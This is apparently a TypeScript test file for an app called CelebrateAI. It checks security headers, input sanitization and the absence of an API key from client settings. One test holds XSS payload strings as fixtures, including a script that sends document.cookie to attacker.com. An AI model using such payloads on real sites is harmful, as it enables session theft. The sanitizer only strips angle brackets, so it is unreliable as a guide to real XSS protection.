import test from 'node:test';
import assert from 'node:assert/strict';

test('validates security response headers configuration', () => {
  const securityHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'SAMEORIGIN',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
  };

  assert.equal(securityHeaders['X-Content-Type-Options'], 'nosniff');
  assert.equal(securityHeaders['X-Frame-Options'], 'SAMEORIGIN');
  assert.equal(securityHeaders['X-XSS-Protection'], '1; mode=block');
  assert.equal(securityHeaders['Referrer-Policy'], 'strict-origin-when-cross-origin');
});

test('validates prevention of malicious script injection in user prompt sanitization', () => {
  const sanitize = (input: string) => input.trim().replace(/[<>]/g, '');

  const malicious1 = '<script>fetch("http://attacker.com/steal?cookie="+document.cookie)</script>';
  assert.equal(
    sanitize(malicious1),
    'scriptfetch("http://attacker.com/steal?cookie="+document.cookie)/script'
  );

  const malicious2 = '<img src=x onerror=alert(1)>';
  assert.equal(sanitize(malicious2), 'img src=x onerror=alert(1)');
});

test('validates server-side API key isolation without client leaking', () => {
  // Ensure dummy client env object does not contain backend secret keys
  const clientEnv = {
    VITE_APP_NAME: 'CelebrateAI',
    MODE: 'production',
  };

  assert.equal((clientEnv as any).GEMINI_API_KEY, undefined, 'GEMINI_API_KEY must never exist in client-side bundle');
});
